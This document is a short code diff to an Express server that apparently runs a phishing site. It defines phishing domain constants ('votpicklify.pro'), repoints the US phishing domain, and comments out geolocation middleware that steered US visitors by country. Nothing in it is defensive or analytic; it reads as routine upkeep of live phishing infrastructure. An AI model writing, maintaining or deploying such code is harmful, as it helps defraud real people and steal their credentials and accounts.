@@ -9,7 +9,7 @@ const fileUpload = require("express-fileupload");
 const {IP2Location} = require("ip2location-nodejs");
 
 const PHISHING_URL = "votpicklify.pro";
-const USA_PHISHING_URL = "vetifyhub.cc";
+const USA_PHISHING_URL = "votpicklify.pro";
 
 
 // CONFIGS
@@ -40,15 +40,15 @@ app.use(
 let ip2location = new IP2Location();
 ip2location.open("./data/IP2LOCATION-LITE-DB1.BIN");
 
-app.use((req, res, next) => {
-  const rawIp = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
-  const ip = rawIp.replace(/^::ffff:/, ''); // Strip IPv6 prefix if present
-  const countryCode = ip2location.getCountryShort(ip);
-  if ((countryCode === 'US') && (![`www.${USA_PHISHING_URL}`, USA_PHISHING_URL].includes(req.hostname))) {
-    return res.status(403).send('Access from the US is blocked.');
-  }
-  next();
-});
+// app.use((req, res, next) => {
+//   const rawIp = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
+//   const ip = rawIp.replace(/^::ffff:/, ''); // Strip IPv6 prefix if present
+//   const countryCode = ip2location.getCountryShort(ip);
+//   if ((countryCode === 'US') && (![`www.${USA_PHISHING_URL}`, USA_PHISHING_URL].includes(req.hostname))) {
+//     return res.status(403).send('Access from the US is blocked.');
+//   }
+//   next();
+// });
 
 // Passport middleware
 app.use(passport.initialize());
